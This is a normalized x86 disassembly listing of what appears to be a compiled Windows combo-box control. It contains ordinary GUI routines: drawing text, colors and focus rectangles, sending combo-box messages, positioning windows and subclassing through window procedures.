mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_44d034
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_450acc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4520bc
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423fe4
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_424c68
call sub_423fe4
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_424ca4
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_450a38
test al al
jne r-xdata
mov eax ebx
call sub_44359c
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4435c0
jmp r-xdata
sub_443c96
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_443df4
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443dfb
lea eax [ ebp - 0x4 ]
call sub_404038
retn
jmp [ eax * 4 + jump_table_443cc4 ]
mov eax edi
mov si 0xffe9
call sub_4034a4
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_4034a4
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_4034a4
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44c8a4
mov eax edi
mov si 0xffeb
call sub_4034a4
mov eax edi
mov si 0xffb2
call sub_4034a4
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_4034a4
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_45183c
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_451928
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_4530b8
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_4530b8
push eax
call PostMessageA
jmp r-xdata
sub_443e28
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443ed1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_44b440
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_4250a4
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443ed8
lea eax [ ebp - 0x14 ]
call sub_404038
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_4252dc
sub_443f04
push esi
push edi
mov esi eax
mov eax esi
call sub_44e980
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_443f2c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_443f80
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_4034a4
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_443fac
push ebx
mov ebx eax
mov eax ebx
call sub_450070
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_443fe4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_44407a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444081
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_444081
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_4440a0
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_4440d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44414f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444156
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_44415c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_44419c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_4441e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4441ec
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4441f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4433dc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403278
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_444278
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4032a8
mov eax [ esi + 0x278 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4434d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4442c8
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_450658
sub_44432c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ff44
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44fe70
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_44438d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_443fac
mov eax ebx
call sub_4530b8
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_4032a8
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_4530b8
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_4444d0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_450454
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_444520
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424ca4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_444574
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_4445a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44465c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44c874
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_404598
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_44c8a4
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406d58
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444663
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_444668
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_444a20
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45209c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444a27
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_40405c
lea eax [ ebp - 0x44 ]
call sub_404038
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_44c874
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_40408c
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404038
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_444574
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_4445a0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042f8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40c38c
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_44c874
mov eax [ ebp - 0x38 ]
call sub_4042f8
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44359c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042f8
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_404598
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4042f8
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_404598
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44c874
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4435c0
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_444574
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44359c
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40c38c
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404220
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_404344
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_404558
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404220
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_404344
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4435c0
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404558
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_404558
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_404344
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_44c8a4
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406d58
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44c874
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_40408c
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_444a30
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404220
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_404344
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_444a30
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_444a30
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_444be5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4042f8
test eax eax
jne r-xdata
mov eax esi
call sub_4044f8
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_4034a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444bec
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_40405c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_40408c
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_4042f8
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_404558
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404344
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_44c8a4
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x1c ]
call sub_4042f8
push eax
mov eax esi
call sub_4042f8
pop edx
call sub_406d58
push eax
push 0x0
push 0x142
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_4034a4
mov eax ebx
mov si 0xffb2
call sub_4034a4
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_444c18
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_4255f0
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_42546c
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_425488
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_4250a4
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424c70
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4244a4
xor edx edx
mov eax [ esi + 0x208 ]
call sub_4255f0
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_444cf0
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_444d1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44df48
mov eax ebx
call sub_44ca9c
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_464294
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44cf6c
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44caac
sub_444d94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_443b88
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424ca4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_444df0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_451248
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445019
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b428
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4250e0
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4250e0
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
